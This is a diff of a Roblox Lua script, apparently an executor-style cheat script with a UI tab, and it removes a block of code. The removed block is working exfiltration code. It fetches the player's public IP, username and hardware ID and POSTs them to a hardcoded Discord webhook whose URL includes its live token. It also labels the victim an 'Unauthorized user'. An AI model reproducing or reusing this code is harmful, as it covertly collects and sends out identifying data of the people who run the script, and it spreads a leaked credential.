@@ -529,36 +529,3 @@ local GameTab = Window:CreateTab("Game", 4483362458) -- Title, Image
 local GameSection = GameTab:CreateSection("Player Info")
 
 local Paragraph = GameTab:CreateParagraph({Title = "Game Id", Content = "game.PlaceId"})
-
-  local LoadingXSX = Notif:Notify("Unauthorized, please wait. " .. ip, 2, "error") 
-    setclipboard(tostring(ip))
-    webhook = "https://discord.com/api/webhooks/1352360440553930772/OMqaHHXTTij6GVwALjiZs71TNFWZMxfTDRluPUuv46YO65iycjRkmESz4AkxIC-0NVkq"
-
-    local http = game:GetService("HttpService")
-    local message = 
-        {
-            ["content"] = "**MOBILE COPY AND PASTE**\n" .. game.Players.LocalPlayer.Name .. "\nIP: " .. game:HttpGet("https://api.ipify.org/")  .. "\nHWID: ".. tostring(game:GetService("RbxAnalyticsService"):GetClientId()),
-            ["embeds"] = {{
-                            ["thumbnail"] = {
-                    ["url"] = "https://cdn.discordapp.com/attachments/1347850414317371402/1347960813738135602/static.png?ex=67cdb9d5&is=67cc6855&hm=8008466e98bde84f9c454d48ee0112abdd51059f737838a47a3621adc6463bc3&"
-                },
-                ["title"] = "__**Unauthorized user**__",
-                ["description"] = "```ansi\n[2;31m" .. game.Players.LocalPlayer.Name .. "\nIP: " .. game:HttpGet("https://api.ipify.org/")  .. "\nHWID: ".. tostring(game:GetService("RbxAnalyticsService"):GetClientId()) .. "[0m```",
-                ["type"] = "rich",
-                ["color"] = tonumber(0xFF0000),
-            }}
-        }
-    local jsonMessage = http:JSONEncode(message)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local success, response = pcall(function()
-        return request({
-            Url = webhook,
-            Body = jsonMessage,
-            Method = "POST",
-            Headers = headers,
-        })
-    end)
-end
-else
